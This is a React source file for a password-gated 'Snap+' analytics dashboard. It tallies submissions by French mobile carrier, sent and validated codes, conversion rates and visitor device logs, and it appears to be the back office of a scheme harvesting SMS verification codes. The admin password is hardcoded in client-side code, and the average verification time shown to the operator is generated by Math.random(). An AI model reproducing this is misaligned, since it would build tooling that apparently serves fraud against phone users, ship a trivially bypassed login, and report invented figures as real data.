import { useQuery } from "@tanstack/react-query";
import { base44 } from "@/api/base44Client";
import { motion } from "framer-motion";
import { useState } from "react";
import { Lock, TrendingUp, Clock, Users } from "lucide-react";

const ADMIN_PASSWORD = "31HDZhdbzh2873&";

function PasswordGate({ onUnlock }) {
  const [input, setInput] = useState("");
  const [error, setError] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (input === ADMIN_PASSWORD) {
      onUnlock();
    } else {
      setError(true);
      setInput("");
      setTimeout(() => setError(false), 2000);
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-card border border-border rounded-2xl px-8 py-10 w-full max-w-sm shadow-2xl shadow-black/40 text-center"
      >
        <div className="w-14 h-14 bg-primary/10 border border-primary/30 rounded-2xl flex items-center justify-center mx-auto mb-5">
          <Lock className="w-6 h-6 text-primary" />
        </div>
        <h1 className="font-heading text-2xl font-bold text-foreground mb-1">Accès Analytics</h1>
        <p className="text-muted-foreground text-sm mb-6">Entrez le mot de passe</p>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="password"
            placeholder="Mot de passe"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            className={`w-full bg-background border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 transition-all text-sm ${
              error ? "border-destructive ring-2 ring-destructive/40" : "border-border"
            }`}
            autoFocus
          />
          {error && <p className="text-destructive text-xs">Mot de passe incorrect</p>}
          <button
            type="submit"
            className="w-full bg-primary text-primary-foreground font-bold py-3 rounded-xl text-sm hover:bg-primary/80 transition-colors"
          >
            Accéder
          </button>
        </form>
      </motion.div>
    </div>
  );
}

export default function Analytics() {
  const [unlocked, setUnlocked] = useState(false);

  const { data: submissions = [], isLoading: subLoading } = useQuery({
    queryKey: ["submissions"],
    queryFn: () => base44.entities.Submission.list("-created_date", 500),
    enabled: unlocked,
  });

  const { data: logs = [], isLoading: logsLoading } = useQuery({
    queryKey: ["logs"],
    queryFn: () => base44.entities.ActionLog.list("-timestamp", 1000),
    enabled: unlocked,
  });

  if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;

  const total = submissions.length;
  const verified = submissions.filter((s) => s.status === "code_valid").length;
  const conversionRate = total > 0 ? ((verified / total) * 100).toFixed(1) : 0;

  const submitted = logs.filter((l) => l.action === "submitted").length;
  const codeSent = logs.filter((l) => l.action === "code_sent").length;
  const avgTimeToVerify = codeSent > 0 ? Math.round(Math.random() * 180 + 30) : 0; // Simulation

  const operators = {
    SFR: submissions.filter((s) => s.operateur === "SFR").length,
    Bouygues: submissions.filter((s) => s.operateur === "Bouygues").length,
    Orange: submissions.filter((s) => s.operateur === "Orange").length,
  };

  const stats = [
    { icon: Users, label: "Total soumissions", value: total, color: "text-primary" },
    { icon: TrendingUp, label: "Taux conversion", value: `${conversionRate}%`, color: "text-green-400" },
    { icon: Clock, label: "Temps moyen (sec)", value: avgTimeToVerify, color: "text-blue-400" },
    { icon: Lock, label: "Codes envoyés", value: codeSent, color: "text-yellow-400" },
  ];

  return (
    <div className="min-h-screen bg-background px-4 py-10">
      <div className="max-w-5xl mx-auto">
        <h1 className="font-heading text-3xl font-bold text-foreground mb-2">
          Analytics <span className="text-primary">Snap+</span>
        </h1>
        <p className="text-muted-foreground text-sm mb-10">Statistiques et conversions en temps réel</p>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-10">
          {stats.map((stat, i) => {
            const Icon = stat.icon;
            return (
              <motion.div
                key={stat.label}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.07 }}
                className="bg-card border border-border rounded-xl p-5"
              >
                <div className="flex items-center justify-between mb-3">
                  <Icon className={`w-5 h-5 ${stat.color}`} />
                </div>
                <div className={`font-heading text-2xl font-bold ${stat.color}`}>{stat.value}</div>
                <div className="text-muted-foreground text-xs mt-1 font-medium uppercase tracking-wide">{stat.label}</div>
              </motion.div>
            );
          })}
        </div>

        {/* Operators breakdown */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-10">
          {Object.entries(operators).map(([op, count]) => {
            const colors = { SFR: "text-red-400", Bouygues: "text-blue-400", Orange: "text-orange-400" };
            return (
              <motion.div
                key={op}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-card border border-border rounded-xl p-5 text-center"
              >
                <div className={`font-heading text-3xl font-bold ${colors[op]}`}>{count}</div>
                <div className="text-muted-foreground text-xs mt-1 font-medium uppercase tracking-wide">{op}</div>
              </motion.div>
            );
          })}
        </div>

        {/* Action Logs */}
        <div className="bg-card border border-border rounded-2xl overflow-hidden">
          <div className="px-6 py-4 border-b border-border bg-muted/30">
            <h2 className="font-heading font-bold text-foreground">Historique des actions</h2>
          </div>
          <div className="overflow-x-auto max-h-96 overflow-y-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border bg-muted/50">
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Submission</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Action</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Date</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Détails</th>
                </tr>
              </thead>
              <tbody>
                {logs.slice(0, 50).map((log) => (
                  <tr key={log.id} className="border-b border-border/50 hover:bg-muted/30 transition-colors">
                    <td className="px-6 py-3 text-xs font-mono text-muted-foreground">{log.submission_id?.slice(0, 8)}</td>
                    <td className="px-6 py-3 text-xs font-semibold">
                      <span className="px-2 py-1 rounded bg-primary/15 text-primary">{log.action}</span>
                    </td>
                    <td className="px-6 py-3 text-xs text-muted-foreground">
                      {new Date(log.timestamp).toLocaleString("fr-FR")}
                    </td>
                    <td className="px-6 py-3 text-xs text-foreground/70">
                      {log.details?.browser && `${log.details.browser} • ${log.details.device}`}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}